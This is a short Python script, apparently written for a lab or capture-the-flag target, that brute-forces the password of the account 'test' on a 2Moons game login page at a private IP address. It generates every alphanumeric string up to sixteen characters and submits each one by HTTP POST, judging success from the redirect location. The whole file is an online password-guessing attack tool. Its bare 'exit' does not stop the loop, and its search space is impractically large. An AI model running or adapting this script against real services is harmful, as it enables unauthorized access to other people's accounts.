import requests
import string


password = ""
valid_charset = string.ascii_letters+string.digits


def trypassword(word: str):
    data = {"uni": "1",
            "username": "test",
            "password": word}
    result = requests.post(
        url="http://10.196.1.207/2moons/index.php?page=login", data=data, allow_redirects=False)

    if result.headers["location"] == "http://10.196.1.207/2moons/index.php?code=1":
        print("Unsuccessful try: " + word)
    else:
        print("Password: " + word)
        exit


def dfs(depth: int):
    global password
    global valid_charset
    if depth == 0:
        trypassword(password)
    else:
        for _ in valid_charset:
            password += _
            dfs(depth - 1)
            password = password[0:-1]


if __name__ == "__main__":
    for i in range(0, 17):
        dfs(i)
